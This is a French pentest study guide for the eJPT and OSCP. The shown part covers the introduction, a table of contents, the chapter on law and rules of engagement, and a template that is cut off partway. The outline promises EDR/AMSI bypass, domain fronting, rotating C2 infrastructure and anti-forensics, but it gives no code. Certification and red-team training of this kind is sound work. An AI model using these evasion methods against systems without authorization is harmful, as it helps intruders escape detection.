# Du eJPT à l'OSCP : Guide complet avec OPSEC offensive intégrée

## Introduction générale

Bienvenue dans ce guide complet qui vous accompagnera depuis les fondamentaux du pentesting jusqu'aux compétences avancées nécessaires pour réussir l'OSCP, tout en intégrant une dimension cruciale souvent négligée : l'OPSEC (Operational Security) offensive.

### Objectifs du guide

Ce document a été conçu avec un double objectif : vous préparer méthodiquement aux certifications eJPT puis OSCP, tout en vous inculquant les principes et techniques d'OPSEC qui font la différence entre un simple testeur d'intrusion et un professionnel de la sécurité offensive. 

Contrairement à de nombreuses ressources qui se concentrent uniquement sur les techniques d'exploitation, nous aborderons systématiquement chaque sujet sous l'angle de la discrétion opérationnelle, en expliquant non seulement comment réussir une action offensive, mais aussi comment la réaliser de manière furtive, en comprenant les traces générées et les méthodes de détection employées par les équipes défensives.

### Parcours de certification eJPT → OSCP

Le parcours que nous vous proposons est progressif et structuré :

1. **Fondations eJPT** : Nous commencerons par les bases essentielles du pentesting, couvrant les connaissances réseau, les techniques de reconnaissance, l'énumération et l'exploitation simple requises pour l'eJPT, tout en introduisant les principes fondamentaux d'OPSEC.

2. **Passerelle intermédiaire** : Cette section vous fera franchir le cap entre les compétences de base et avancées, en approfondissant les techniques d'exploitation, en introduisant la programmation pour l'automatisation, et en renforçant votre approche OPSEC.

3. **Compétences OSCP avancées** : Enfin, nous aborderons les sujets complexes nécessaires pour l'OSCP, comme l'exploitation d'Active Directory, les buffer overflows, le pivoting avancé, et les infrastructures C2 sophistiquées avec une OPSEC de niveau professionnel.

### Importance de l'OPSEC dans le pentesting moderne

L'OPSEC n'est plus une option dans le monde du pentesting moderne. Avec l'évolution des solutions de détection et de réponse (EDR, XDR, SIEM), un pentester qui néglige l'OPSEC :
- Risque de déclencher des alertes qui compromettent sa mission
- Ne reflète pas les conditions réelles d'une attaque ciblée
- Manque l'opportunité d'évaluer véritablement les capacités défensives de l'organisation

Ce guide intègre l'OPSEC à trois niveaux progressifs :
1. **Niveau 1 - Hygiène de base & cloisonnement** : Gestion des identités, VM jetables, proxychains basiques
2. **Niveau 2 - Furtivité active** : Chiffrement TLS personnalisé, contournement AMSI/EDR, traffic shaping
3. **Niveau 3 - Infrastructure C2 & OPSEC complexe** : Architecture multi-niveaux, profiles avancés, anti-forensics éthique

### Comment utiliser ce guide

Pour tirer le meilleur parti de ce document :

1. **Suivez la progression** : Les chapitres sont organisés selon une difficulté croissante. Ne sautez pas d'étapes.

2. **Pratiquez systématiquement** : Chaque chapitre se termine par un exercice guidé. Réalisez-le intégralement avant de passer au suivant.

3. **Testez vos connaissances** : Les mini-quiz vous permettent de vérifier votre compréhension des concepts clés.

4. **Adoptez la mentalité Blue Team** : Pour chaque technique offensive, prenez l'habitude de vous demander : "Comment cela pourrait-il être détecté ? Quelles traces est-ce que je laisse ?"

5. **Référez-vous au plan d'étude** : En annexe, vous trouverez un programme détaillé sur 60 jours qui vous guidera pas à pas.

Que vous soyez un débutant complet en sécurité offensive ou que vous cherchiez à structurer vos connaissances pour l'OSCP tout en développant une approche OPSEC solide, ce guide vous fournira les connaissances, méthodologies et exercices pratiques nécessaires pour atteindre vos objectifs.

Commençons notre voyage dans l'univers du pentesting et de l'OPSEC offensive !
# Du eJPT à l'OSCP : Guide complet avec OPSEC offensive intégrée

## Table des matières détaillée

### Introduction générale
- Objectifs du guide
- Parcours de certification eJPT → OSCP
- Importance de l'OPSEC dans le pentesting moderne
- Comment utiliser ce guide

### PARTIE I : FONDATIONS eJPT (+ OPSEC NIVEAU 1)

#### Chapitre 1 : Introduction & cadre légal
- Introduction : Pourquoi ce thème est important
- Définitions : Pentest vs Red Team vs Bug Bounty
- Cadre légal : RGPD, loi française, autorisations
- Règles d'engagement (RoE) : structure et importance
- Chaîne d'attaque (Kill Chain) et méthodologie
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Rédaction d'un modèle de RoE

#### Chapitre 2 : Environnement labo
- Introduction : Pourquoi ce thème est important
- Configuration de l'environnement attaquant (Kali 2024.1)
- Configuration des cibles (Windows Server 2019, Windows 10 Pro, Windows 11, Ubuntu 22.04 LTS)
- Mise en place d'un réseau virtuel (VirtualBox/VMware)
- Installation des applications vulnérables (Metasploitable 2, OWASP Juice Shop, DVWA, WordPress)
- Connexion VPN vers plateformes cloud (TryHackMe / HackTheBox)
- Snapshots et sauvegardes
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Configuration complète d'un environnement de test

#### Chapitre 3 : Réseaux & TCP/IP pour pentesters
- Introduction : Pourquoi ce thème est important
- Modèle OSI et TCP/IP : focus pentester
- Ports et services courants
- Wireshark 101 : capture et analyse de base
- Analyse de paquets : handshakes TCP, requêtes DNS, trafic HTTP
- Vue Blue Team / logs générés / alertes SIEM
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Analyse de captures réseau

#### Chapitre 4 : Scans & Nmap
- Introduction : Pourquoi ce thème est important
- Méthodologie de scan réseau
- Nmap : commandes essentielles (-sS, -sV, -A)
- Timing et optimisation (-T, --min-rate)
- Contournement de pare-feu (-f, --mtu, --data-length)
- Analyse des résultats et parsing XML
- Vue Blue Team / logs générés / alertes SIEM
- OPSEC Tips : réduction de la détectabilité des scans
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Scan furtif d'un réseau

#### Chapitre 5 : Énumération Linux & Windows
- Introduction : Pourquoi ce thème est important
- Énumération Linux : services, utilisateurs, fichiers sensibles
- Énumération Windows : services, utilisateurs, partages
- Outils spécialisés : enum4linux-ng, RPCclient, SMBmap
- Automatisation de l'énumération
- Vue Blue Team / logs générés / alertes SIEM
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Énumération complète d'une cible

#### Chapitre 6 : Web basics
- Introduction : Pourquoi ce thème est important
- Protocole HTTP : méthodes, codes de statut, en-têtes
- Configuration et utilisation de Burp Suite
- Découverte de contenu : dirb/gobuster/ffuf
- Vulnérabilités web courantes : XSS, SQLi, LFI/RFI
- Vue Blue Team / logs générés / alertes SIEM
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Test d'une application OWASP Juice Shop

#### Chapitre 7 : OPSEC Niveau 1 - Hygiène & traces
- Introduction : Pourquoi ce thème est important
- Gestion des identités et pseudonymes
- Cloisonnement des environnements (VM jetables)
- Proxychains niveau 1
- Logs courants générés par les actions offensives
- Premiers filtres AV et leur contournement
- Pièges classiques et erreurs à éviter
- Vue Blue Team / logs générés / alertes SIEM
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Mise en place d'un environnement cloisonné

#### Chapitre 8 : Exploitation eJPT typiques
- Introduction : Pourquoi ce thème est important
- Exploitation de services mal configurés (FTP anonyme, SMB)
- Exploitation web : RFI/LFI, upload de fichiers
- Élévation de privilèges simple
- Maintien d'accès basique
- Vue Blue Team / logs générés / alertes SIEM
- OPSEC Tips : réduction des traces d'exploitation
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Exploitation complète d'une machine Metasploitable 2

### PARTIE II : PASSERELLE INTERMÉDIAIRE (+ OPSEC NIVEAU 2)

#### Chapitre 9 : Scripts Bash/Python pour l'auto-enum
- Introduction : Pourquoi ce thème est important
- Bash pour pentesters : automatisation des tâches répétitives
- Python pour pentesters : bibliothèques utiles
- Création de scripts d'énumération personnalisés
- Modèles, sockets, pexpect
- Vue Blue Team / logs générés / alertes SIEM
- OPSEC Tips : scripts discrets
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Développement d'un scanner personnalisé

#### Chapitre 10 : Password attacks
- Introduction : Pourquoi ce thème est important
- Types d'attaques : online vs offline
- Création et personnalisation de wordlists
- Hydra pour attaques en ligne
- Hashcat et John the Ripper pour attaques hors ligne
- Règles de mutation de mots de passe
- Vue Blue Team / logs générés / alertes SIEM
- OPSEC Tips : éviter le blocage de compte
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Craquage de différents types de hachage

#### Chapitre 11 : Exploitation Web avancée
- Introduction : Pourquoi ce thème est important
- Contournement d'authentification
- Server-Side Request Forgery (SSRF)
- Techniques avancées d'upload de fichiers
- Exploitation de vulnérabilités dans des CMS
- Vue Blue Team / logs générés / alertes SIEM
- OPSEC Tips : exploitation web discrète
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Exploitation d'une instance WordPress vulnérable

#### Chapitre 12 : Buffer Overflow (Linux) introductif
- Introduction : Pourquoi ce thème est important
- Théorie de la pile (stack)
- Utilisation de gdb-gef pas-à-pas
- Création d'un exploit simple
- Contournement des protections de base
- Vue Blue Team / logs générés / alertes SIEM
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Exploitation d'un BOF Linux simple

#### Chapitre 13 : PrivEsc Linux
- Introduction : Pourquoi ce thème est important
- Méthodologie d'élévation de privilèges
- Exploitation de binaires SUID
- Exploitation des capabilities
- Utilisation de GTFOBins
- Kernel exploits
- Vue Blue Team / logs générés / alertes SIEM
- OPSEC Tips : élévation de privilèges discrète
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Élévation de privilèges sur Ubuntu 22.04

#### Chapitre 14 : OPSEC Niveau 2 - Furtivité active
- Introduction : Pourquoi ce thème est important
- Chiffrement C2 (chisel, socat/tls)
- Obfuscation de payloads
- Bypass AMSI
- Traffic shaping Nmap
- Pièges classiques et erreurs à éviter
- Vue Blue Team / logs générés / alertes SIEM
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Mise en place d'un tunnel chiffré

### PARTIE III : COMPÉTENCES OSCP AVANCÉES (+ OPSEC NIVEAU 3)

#### Chapitre 15 : Active Directory enumeration
- Introduction : Pourquoi ce thème est important
- Structure et composants d'Active Directory
- Énumération avec BloodHound
- Techniques LDAP (ldapsearch)
- Kerberoasting et AS-REP Roasting
- Vue Blue Team / logs générés / alertes SIEM
- OPSEC Tips : énumération AD discrète
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Cartographie complète d'un domaine AD

#### Chapitre 16 : Windows BOF & mona.py
- Introduction : Pourquoi ce thème est important
- Théorie du Buffer Overflow Windows
- Utilisation de vulnserver
- Techniques avec pattern_offset
- Exploitation de SEH
- Utilisation de mona.py
- Vue Blue Team / logs générés / alertes SIEM
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Exploitation complète d'un BOF Windows

#### Chapitre 17 : PrivEsc Windows
- Introduction : Pourquoi ce thème est important
- Méthodologie d'élévation de privilèges Windows
- Techniques JuicyPotato, PrintSpoofer
- UAC bypass
- Exploitation de services vulnérables
- Vue Blue Team / logs générés / alertes SIEM
- OPSEC Tips : élévation de privilèges discrète
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Élévation de privilèges sur Windows 10 et Windows 11

#### Chapitre 18 : Pivoting & Tunnels
- Introduction : Pourquoi ce thème est important
- Théorie du pivoting réseau
- SSH-SOCKS et port forwarding
- Utilisation de chisel
- Configuration de proxychains
- Mise en place d'un mini-réseau avec pfSense
- Vue Blue Team / logs générés / alertes SIEM
- OPSEC Tips : pivoting discret
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Pivoting multi-hôte

#### Chapitre 19 : Exploitation automatisée
- Introduction : Pourquoi ce thème est important
- Création de payloads avec msfvenom
- Utilisation de frameworks C2 (Cobalt Strike, Sliver)
- Personnalisation des payloads
- Contournement des défenses
- Vue Blue Team / logs générés / alertes SIEM
- OPSEC Tips : exploitation discrète
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Création et déploiement d'un payload personnalisé

#### Chapitre 20 : Post-Exploitation & Looting
- Introduction : Pourquoi ce thème est important
- Extraction de credentials (dump de hachages)
- Exploitation de DPAPI
- Récupération de credentials de navigateurs
- Exfiltration de données
- Vue Blue Team / logs générés / alertes SIEM
- OPSEC Tips : looting discret
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Post-exploitation complète

#### Chapitre 21 : OPSEC Niveau 3 - Infrastructure C2 & OPSEC complexe
- Introduction : Pourquoi ce thème est important
- Architecture multi-niveaux
  - Redirecteurs (Apache/Nginx)
  - CDN/edge (Cloudflare Workers, Fastly)
  - Serveurs leurres
  - Staging nodes
- Profiles & traffic shaping avancés
  - Cobalt Strike Malleable C2
  - Sliver badgers
  - Mythic payloads (jitter, sleeptime, header randomisation, taille paquets)
- TLS mutual-auth + domain-fronting
  - Mise en place pas-à-pas (certificats client, SNI trompeur)
- Résilience & rotation
  - Terraform/Ansible pour reconstruire l'infra
  - Rotation IP/CDN
  - Swap de sous-domaines DNS
- OPSEC réseau
  - Chaff
  - Tunnelling HTTP/2-3
  - DoH/DoT
  - Split-tunnel WireGuard
- Détection côté Blue Team
  - Indicateurs (JA3, SNI, NetFlow/beaconing)
  - Techniques d'obfuscation légales
- Anti-forensics éthique
  - Exécution in-memory only
  - Nettoyage minimal (pas de tampering illégal des Event Logs)
  - Living-off-the-land raisonné
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Déploiement complet d'une infrastructure C2 avec checklist OPSEC

#### Chapitre 22 : Reporting & Remédiation
- Introduction : Pourquoi ce thème est important
- Structure d'un rapport de pentest professionnel
- Rédaction d'un executive summary
- Création d'une matrice de vulnérabilités
- Utilisation du CVSS
- Recommandations de remédiation
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Rédaction d'un rapport complet

#### Chapitre 23 : Simulation d'examen OSCP
- Introduction : Pourquoi ce thème est important
- Stratégie pour l'examen OSCP
- Time-boxing et gestion du temps
- OPSEC pendant l'examen
- Méthodologie de documentation
- Points clés
- Mini-quiz (3 QCM)
- Lab/Exercice guidé : Simulation d'examen 24h

### Annexes

#### Glossaire
- 40 termes essentiels (pentest + opsec)

#### Plan d'étude 60 jours
- Programme détaillé : 2-3h/jour
- Ressources, exercices et objectifs mesurables

#### Ressources complémentaires
- MITRE ATT&CK
- NIST 800-115
- OffSec labs
- TryHackMe/HTB rooms recommandées
# PARTIE I : FONDATIONS eJPT (+ OPSEC NIVEAU 1)

## Chapitre 1 : Introduction & cadre légal

### Introduction : Pourquoi ce thème est important

Avant de plonger dans les aspects techniques du pentesting, il est essentiel de comprendre le cadre légal et éthique dans lequel s'inscrit cette activité. Un test d'intrusion réalisé sans autorisation explicite ou hors du périmètre défini peut avoir des conséquences juridiques graves, pouvant aller jusqu'à des poursuites pénales. Ce chapitre pose les fondations éthiques et légales indispensables à tout professionnel de la sécurité offensive, et constitue un prérequis absolu avant toute action technique.

### Définitions : Pentest vs Red Team vs Bug Bounty

#### Test d'intrusion (Pentest)
Un test d'intrusion est une évaluation de sécurité autorisée, limitée dans le temps et le périmètre, visant à identifier et exploiter les vulnérabilités d'un système d'information. L'objectif est d'évaluer le niveau de sécurité réel et de fournir des recommandations d'amélioration.

**Caractéristiques clés :**
- Durée limitée (généralement 1 à 4 semaines)
- Périmètre clairement défini
- Objectifs précis (ex: évaluer la sécurité d'une application web)
- Méthodologie structurée
- Communication ouverte avec le client
- Rapport détaillé des vulnérabilités et recommandations

#### Red Team
Une opération de Red Team est un exercice de simulation d'attaque avancée, souvent réalisée sur une période plus longue, avec un objectif orienté vers des scénarios réalistes d'attaquants ciblés.

**Caractéristiques clés :**
- Durée plus longue (plusieurs semaines à plusieurs mois)
- Approche basée sur des scénarios d'attaque réels
- Simulation d'adversaires spécifiques (APT)
- Furtivité et évasion des défenses comme objectifs principaux
- Test des capacités de détection et de réponse de l'organisation
- Souvent réalisée à l'insu des équipes de sécurité (Blue Team)

#### Bug Bounty
Un programme de Bug Bounty est un système de récompense mis en place par une organisation pour encourager les chercheurs en sécurité à découvrir et signaler des vulnérabilités.

**Caractéristiques clés :**
- Ouvert à de nombreux chercheurs simultanément
- Périmètre défini mais généralement plus large
- Rémunération basée sur la gravité des vulnérabilités découvertes
- Pas d'exploitation complète des vulnérabilités (preuve de concept uniquement)
- Processus de divulgation responsable

**Tableau comparatif :**

| Critère | Pentest | Red Team | Bug Bounty |
|---------|---------|----------|------------|
| Durée | 1-4 semaines | Plusieurs semaines/mois | Continu |
| Objectif | Évaluation complète | Simulation d'attaque réaliste | Découverte de vulnérabilités |
| Connaissance du client | Complète | Limitée | Variable |
| Exploitation | Complète | Complète | Limitée (PoC) |
| OPSEC | Basique | Avancée | Variable |
| Rapport | Détaillé et exhaustif | Orienté scénario | Par vulnérabilité |

### Cadre légal : RGPD, loi française, autorisations

#### Législation française applicable

En France, plusieurs textes de loi encadrent les activités de sécurité offensive :

1. **Code pénal, articles 323-1 à 323-8** : Ces articles définissent et sanctionnent les atteintes aux systèmes de traitement automatisé de données (STAD).
   - L'article 323-1 punit "le fait d'accéder ou de se maintenir, frauduleusement, dans tout ou partie d'un système de traitement automatisé de données" de deux ans d'emprisonnement et 60 000 € d'amende.
   - Les peines sont aggravées si l'accès entraîne une suppression ou modification de données, ou une altération du fonctionnement du système.

2. **Loi Informatique et Libertés (1978, modifiée)** : Encadre le traitement des données personnelles et impose des obligations de sécurité.

3. **RGPD (Règlement Général sur la Protection des Données)** : Impose des obligations strictes concernant la protection des données personnelles, avec des amendes pouvant atteindre 4% du chiffre d'affaires mondial.

#### Autorisations nécessaires

Pour réaliser légalement un test d'intrusion, vous devez impérativement obtenir :

1. **Une autorisation écrite explicite** du propriétaire légitime des systèmes testés.
   - Cette autorisation doit préciser le périmètre exact, les dates, les types de tests autorisés et les coordonnées des responsables.
   - Elle doit être signée par une personne ayant l'autorité légale pour l'accorder (généralement un dirigeant ou RSSI).

2. **Une clause de non-poursuite** protégeant le pentester en cas de dommages accidentels.

3. **Des autorisations spécifiques** pour certains types de tests sensibles (DoS, ingénierie sociale, etc.).

#### Cas particuliers et zones grises

1. **Tests sur des infrastructures cloud** : Nécessitent l'autorisation du client ET du fournisseur cloud (AWS, Azure, etc.).

2. **Tests impliquant des tiers** : Si le périmètre inclut des services hébergés chez des tiers, leur autorisation est également requise.

3. **Découverte de données sensibles** : Obligation de signalement immédiat au client et arrêt potentiel des tests.

### Règles d'engagement (RoE) : structure et importance

Les Règles d'Engagement (Rules of Engagement - RoE) constituent le document contractuel définissant précisément le cadre, les limites et les modalités du test d'intrusion.

#### Structure type d'un document RoE

1. **Informations générales**
   - Identification des parties (client et prestataire)
   - Dates de début et fin des tests
   - Contacts d'urgence des deux côtés

2. **Périmètre technique**
   - Liste exhaustive des systèmes, applications, réseaux concernés
   - Adresses IP, noms de domaines, plages d'adresses
   - Environnements (production, préproduction, test)

3. **Types de tests autorisés**
   - Techniques permises (scan, exploitation, élévation de privilèges, etc.)
   - Techniques explicitement interdites (DoS, exploitation de vulnérabilités destructives, etc.)
   - Horaires autorisés pour les tests (heures ouvrées ou non)

4. **Gestion des incidents**
   - Procédure en cas de panne ou d'impact non prévu
   - Chaîne d'escalade et contacts d'urgence
   - Conditions d'arrêt des tests

5. **Livrables attendus**
   - Format et contenu du rapport
   - Délais de livraison
   - Procédure de restitution

6. **Clauses juridiques**
   - Confidentialité
   - Limitation de responsabilité
   - Non-divulgation des résultats

#### Importance critique des RoE

Les RoE sont essentielles pour plusieurs raisons :

1. **Protection juridique** : Elles constituent la preuve que vos actions sont autorisées et définissent clairement ce que vous pouvez et ne pouvez pas faire.

2. **Clarification des attentes** : Elles permettent d'aligner les attentes du client avec ce qui sera réellement testé.

3. **Gestion des risques** : Elles définissent les procédures en cas d'incident, limitant les impacts potentiels.

4. **Référence en cas de litige** : En cas de désaccord, les RoE servent de document de référence pour trancher.

### Chaîne d'attaque (Kill Chain) et méthodologie

#### La Kill Chain de Lockheed Martin

La chaîne d'attaque, ou "Cyber Kill Chain", est un modèle développé par Lockheed Martin qui décrit les différentes phases d'une cyberattaque. Elle comprend sept étapes :

1. **Reconnaissance** : Collecte d'informations sur la cible (OSINT, scan de ports, etc.)
2. **Armement** : Préparation de l'exploit et du payload
3. **Livraison** : Transmission du vecteur d'attaque à la cible (phishing, exploitation web, etc.)
4. **Exploitation** : Déclenchement du code malveillant pour exploiter une vulnérabilité
5. **Installation** : Mise en place d'une porte dérobée ou d'un accès persistant
6. **Commande et Contrôle (C2)** : Établissement d'un canal de communication avec le système compromis
7. **Actions sur objectifs** : Réalisation des objectifs de l'attaque (exfiltration de données, sabotage, etc.)

#### Méthodologies de pentest

Plusieurs méthodologies structurées existent pour guider les tests d'intrusion :

1. **PTES (Penetration Testing Execution Standard)**
   - Interactions préliminaires
   - Collecte de renseignements
   - Modélisation des menaces
   - Analyse de vulnérabilités
   - Exploitation
   - Post-exploitation
   - Rapport

2. **OSSTMM (Open Source Security Testing Methodology Manual)**
   - Approche plus formelle et exhaustive
   - Couvre la sécurité physique, humaine, télécoms, réseaux et sans-fil
   - Utilise des métriques précises pour quantifier la sécurité

3. **OWASP Testing Guide**
   - Spécifique aux applications web
   - Organisé par types de tests (configuration, authentification, autorisation, etc.)
   - Très détaillé sur chaque technique de test

#### Adaptation au contexte eJPT/OSCP

Pour les besoins de ce guide et des certifications visées, nous adopterons une méthodologie simplifiée mais rigoureuse :

1. **Préparation**
   - Définition du périmètre et des objectifs
   - Mise en place de l'environnement de test
   - Configuration des outils

2. **Reconnaissance**
   - Passive (OSINT, recherche publique)
   - Active (scan réseau, énumération des services)

3. **Analyse de vulnérabilités**
   - Identification des failles potentielles
   - Recherche d'exploits correspondants
   - Priorisation des vecteurs d'attaque

4. **Exploitation**
   - Exploitation des vulnérabilités identifiées
   - Obtention d'un accès initial

5. **Post-exploitation**
   - Élévation de privilèges
   - Mouvement latéral
   - Persistance (si autorisée)
   - Collecte de preuves

6. **Documentation**
   - Capture d'écran et journalisation des actions
   - Rédaction du rapport
   - Recommandations de remédiation

### Vue Blue Team / logs générés / alertes SIEM

Comprendre la perspective défensive est essentiel pour tout pentester, particulièrement dans une approche OPSEC. Voici les principales traces que vos actions peuvent générer :

#### Reconnaissance

**Logs générés :**
- Journaux de connexion des serveurs web (adresse IP source, user-agent, pages visitées)
- Logs DNS pour les résolutions de noms
- Alertes de scan de ports (particulièrement pour les scans agressifs)

**Détection possible :**
- Concentration inhabituelle de requêtes depuis une même source
- Patterns de scan reconnaissables (séquence de ports, timing)
- User-agents non standards ou outils de reconnaissance identifiables

#### Exploitation

**Logs générés :**
- Journaux d'authentification (tentatives échouées)
- Logs d'application (erreurs, exceptions)
- Alertes IDS/IPS sur des signatures d'attaques connues
- Journaux de pare-feu pour les connexions bloquées

**Détection possible :**
- Multiples échecs d'authentification
- Requêtes contenant des payloads malveillants (SQLi, XSS, etc.)
- Exécution de commandes système inhabituelles
- Création de processus suspects

#### Post-exploitation

**Logs générés :**
- Création de nouveaux comptes ou modification de privilèges
- Exécution de commandes avec privilèges élevés
- Connexions réseau inhabituelles (C2, exfiltration)
- Modifications de la configuration système

**Détection possible :**
- Activité administrative en dehors des heures habituelles
- Connexions depuis des postes non autorisés
- Transferts de données volumineux ou vers des destinations inhabituelles
- Utilisation d'outils d'administration légitimes à des fins malveillantes (Living Off The Land)

### Pièges classiques et erreurs à éviter

#### Erreurs juridiques et contractuelles

1. **Absence d'autorisation écrite** : Ne jamais commencer un test sans autorisation formelle signée.
2. **Dépassement de périmètre** : Rester strictement dans les limites définies, même si vous découvrez des systèmes intéressants hors périmètre.
3. **Non-respect des horaires** : Certains tests peuvent être limités à des plages horaires spécifiques.
4. **Exploitation excessive** : Ne pas exploiter des vulnérabilités destructives ou à haut risque sans autorisation explicite.

#### Erreurs techniques

1. **Tests de DoS non maîtrisés** : Peuvent causer des interruptions de service non prévues.
2. **Exploitation sans sauvegarde** : Toujours s'assurer que le système peut être restauré.
3. **Propagation non contrôlée** : Particulièrement avec les malwares ou exploits automatisés.
4. **Suppression accidentelle de logs** : Peut être interprétée comme une tentative de dissimulation.

#### Erreurs de communication

1. **Non-signalement d'incidents** : Tout impact non prévu doit être immédiatement signalé.
2. **Manque de documentation** : Documenter précisément chaque action pour pouvoir justifier et expliquer.
3. **Jargon excessif** : Adapter la communication à l'interlocuteur (technique vs management).
4. **Minimisation des risques** : Ne jamais sous-estimer l'impact potentiel d'une vulnérabilité.

### OPSEC Tips : bonnes pratiques initiales

Même pour un test d'intrusion standard, certaines pratiques OPSEC de base sont recommandées :

1. **Cloisonnement des environnements** : Utiliser des machines dédiées aux tests, idéalement des VMs réinitialisées après chaque mission.

2. **Gestion des identités** : Ne pas utiliser vos comptes personnels ou professionnels habituels pour les tests.

3. **Sécurisation des communications** : Chiffrer les communications avec le client et les données sensibles découvertes.

4. **Contrôle des outils** : Éviter d'utiliser des outils exotiques ou non maîtrisés qui pourraient avoir des comportements imprévus.

5. **Documentation sécurisée** : Protéger vos notes, captures d'écran et rapports intermédiaires.

### Points clés

- Un test d'intrusion n'est légal que s'il est explicitement autorisé par écrit par le propriétaire légitime des systèmes.
- Les Règles d'Engagement (RoE) constituent le document de référence définissant précisément le cadre et les limites du test.
- Comprendre la perspective défensive (Blue Team) est essentiel pour réaliser des tests efficaces et discrets.
- La méthodologie adoptée doit être structurée, documentée et adaptée aux objectifs spécifiques du test.
- Les erreurs les plus courantes sont souvent liées à des problèmes de communication ou de dépassement de périmètre.

### Mini-quiz (3 QCM)

1. **Quelle autorisation est indispensable avant de commencer un test d'intrusion ?**
   - A) Une autorisation verbale du responsable informatique
   - B) Une autorisation écrite du propriétaire légitime des systèmes
   - C) Une autorisation de l'ANSSI
   - D) Aucune autorisation si le test est réalisé à des fins éducatives

   *Réponse : B*

2. **Lors d'un test d'intrusion, vous découvrez une vulnérabilité critique sur un système hors du périmètre défini. Que devez-vous faire ?**
   - A) L'exploiter pour démontrer le risque
   - B) L'ignorer complètement
   - C) Signaler sa présence au client sans l'exploiter
   - D) Étendre le périmètre sans autorisation pour inclure ce système

   *Réponse : C*

3. **Quelle est la principale différence entre un test d'intrusion et un exercice de Red Team ?**
   - A) Le test d'intrusion est illégal, contrairement au Red Team
   - B) Le test d'intrusion vise à identifier un maximum de vulnérabilités, tandis que le Red Team simule un scénario d'attaque réaliste
   - C) Le test d'intrusion ne nécessite pas d'autorisation, contrairement au Red Team
   - D) Le test d'intrusion n'inclut jamais de phase d'exploitation, contrairement au Red Team

   *Réponse : B*

### Lab/Exercice guidé : Rédaction d'un modèle de RoE

#### Objectif
Rédiger un document de Règles d'Engagement (RoE) complet pour un test d'intrusion fictif.

#### Prérequis
- Éditeur de texte
- Modèles de RoE (fournis ci-dessous)

#### Scénario
Vous êtes consultant en sécurité pour la société "SecureTest". Votre client, "TechCorp", souhaite faire réaliser un test d'intrusion sur son infrastructure web. Vous devez rédiger les Règles d'Engagement pour ce test.

#### Étapes

1. **Création du document de base**
   ```bash
   mkdir -p ~/pentest_labs/roe_exercise
   cd ~/pentest_labs/roe_exercise
   touch techcorp_roe.md
   ```

2. **Structure du document**
   Ouvrez le fichier et créez les sections suivantes :
   - Informations générales
   - Périmètre technique
   - Types de tests autorisés
   - Gestion des incidents
   - Livrables attendus
   - Clauses juridiques

3. **Informations générales**
   Complétez avec :
   - Nom et coordonnées du prestataire (SecureTest)
   - Nom et coordonnées du client (TechCorp)
   - Dates de début et fin des tests (sur 2 semaines)
   - Contacts d'urgence des deux côtés

4. **Périmètre technique**
   Définissez :
   - Site web principal : www.techcorp-fictive.com (192.168.1.10)
   - Application de gestion interne : app.techcorp-fictive.com (192.168.1.20)
   - Serveur de base de données : db.techcorp-fictive.com (192.168.1.30)
   - Exclusions explicites (infrastructure de production critique)

5. **Types de tests autorisés**
   Précisez :
   - Reconnaissance passive et active
   - Scan de vulnérabilités
   - Exploitation des vulnérabilités sans risque d'interruption
   - Élévation de privilèges
   - Tests interdits : DoS, attaques par force brute prolongées, exploitation destructive

6. **Gestion des incidents**
   Détaillez :
   - Procédure de notification en cas d'impact non prévu
   - Chaîne d'escalade avec contacts hiérarchiques
   - Conditions d'arrêt immédiat des tests

7. **Livrables attendus**
   Spécifiez :
   - Rapport exécutif pour la direction
   - Rapport technique détaillé
   - Preuves (captures d'écran, logs)
   - Recommandations de remédiation priorisées

8. **Clauses juridiques**
   Incluez :
   - Clause de confidentialité
   - Limitation de responsabilité
   - Propriété intellectuelle des résultats
   - Signatures des parties

#### Modèle de base

```markdown
# Règles d'Engagement - Test d'intrusion

## 1. Informations générales

**Prestataire :** SecureTest
- Adresse : [Adresse]
- Contact principal : [Nom], [Email], [Téléphone]
- Contact technique : [Nom], [Email], [Téléphone]

**Client :** TechCorp
- Adresse : [Adresse]
- Contact principal : [Nom], [Email], [Téléphone]
- Contact technique : [Nom], [Email], [Téléphone]

**Période de test :**
- Date de début : [Date]
- Date de fin : [Date]
- Horaires autorisés : [Horaires]

## 2. Périmètre technique

**Systèmes inclus dans le périmètre :**
- [Système 1] : [Description], [Adresse IP/URL]
- [Système 2] : [Description], [Adresse IP/URL]
- [Système 3] : [Description], [Adresse IP/URL]

**Systèmes explicitement exclus :**
- [Système A] : [Raison de l'exclusion]
- [Système B] : [Raison de l'exclusion]

## 3. Types de tests autorisés

**Tests autorisés :**
- [Test 1] : [Détails/limitations]
- [Test 2] : [Détails/limitations]
- [Test 3] : [Détails/limitations]

**Tests explicitement interdits :**
- [Test X] : [Raison de l'interdiction]
- [Test Y] : [Raison de l'interdiction]

## 4. Gestion des incidents

**Procédure de notification :**
- [Étapes détaillées]

**Contacts d'urgence :**
- Niveau 1 : [Nom], [Rôle], [Téléphone]
- Niveau 2 : [Nom], [Rôle], [Téléphone]
- Niveau 3 : [Nom], [Rôle], [Téléphone]

**Conditions d'arrêt des tests :**
- [Condition 1]
- [Condition 2]

## 5. Livrables attendus

**Documents à fournir :**
- [Document 1] : [Description], [Date de livraison]
- [Document 2] : [Description], [Date de livraison]

**Format et méthode de livraison :**
- [Détails]

